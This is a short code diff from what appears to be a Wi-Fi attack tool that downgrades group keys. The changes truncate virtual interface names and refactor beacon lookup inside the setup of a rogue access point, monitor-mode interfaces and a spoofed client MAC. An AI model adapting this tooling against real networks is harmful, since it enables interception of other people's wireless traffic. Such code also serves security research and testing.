@@ -777,20 +777,20 @@ class downgradeGTK():
 		log(STATUS, "Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect")
 
 		# 1. Remove unused virtual interfaces
-		subprocess.call(["iw", self.nic_real + "sta1", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+		subprocess.call(["iw", ("sta1" + self.nic_real)[:15], "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 		if self.nic_rogue_mon is None:
-			subprocess.call(["iw", self.nic_rogue_ap + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+			subprocess.call(["iw", ("mon" + self.nic_rogue_ap)[:15], "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 
 		# 2. Configure monitor mode on interfaces
 		set_monitor_mode(self.nic_real, up=False, mtu=2000)
 		if self.nic_rogue_mon is None:
-			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
+			self.nic_rogue_mon = ("mon" + self.nic_rogue_ap)[:15]
 			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "monitor"])
 			set_monitor_mode(self.nic_rogue_mon, up=False, mtu=2000)
 
 		# 3. Configure interface on real channel to ACK frames
 		if self.clientmac:
-				self.nic_real_clientack = self.nic_real + "sta1"
+				self.nic_real_clientack = ("sta1" + self.nic_real)[:15]
 				subprocess.check_output(["iw", self.nic_real, "interface", "add", self.nic_real_clientack, "type", "managed"])
 				time.sleep(0.3)
 				set_macaddress(self.nic_real_clientack, self.clientmac)
@@ -823,7 +823,7 @@ class downgradeGTK():
 
 		# Test monitor mode and get MAC address of the network
 		if self.nic_real_clientack: subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
-		self.beacon = find_network(self.nic_real, self.ssid, opened_socket=self.sock_real)
+		self.find_beacon(self.ssid)
 		if self.beacon is None:
 			log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
 			return
